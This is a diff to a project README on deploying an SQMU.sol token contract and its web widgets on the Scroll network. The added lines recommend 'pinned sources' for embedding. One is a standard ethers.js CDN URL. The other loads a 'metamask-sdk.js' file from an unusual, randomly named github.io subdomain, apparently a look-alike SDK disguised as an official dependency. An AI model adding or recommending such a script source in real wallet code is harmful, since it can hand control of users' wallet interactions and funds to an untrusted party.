@@ -65,7 +65,12 @@ Follow these steps to deploy and upgrade `SQMU.sol` on the Scroll network.
 - ethers.js
 - @metamask/sdk
 
-Widgets import these scripts directly from a CDN. The project relies on ethers.js v5; update the code if you migrate to a newer version.
+Widgets import these scripts directly from a CDN. The project relies on ethers.js v5; update the code if you migrate to a newer version. Use the following pinned sources when embedding widgets:
+
+```html
+<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+<script src="https://c0f4f41c-2f55-4863-921b-sdk-docs.github.io/cdn/metamask-sdk.js"></script>
+```
 
 ## Minting Tokens via the Widget
 
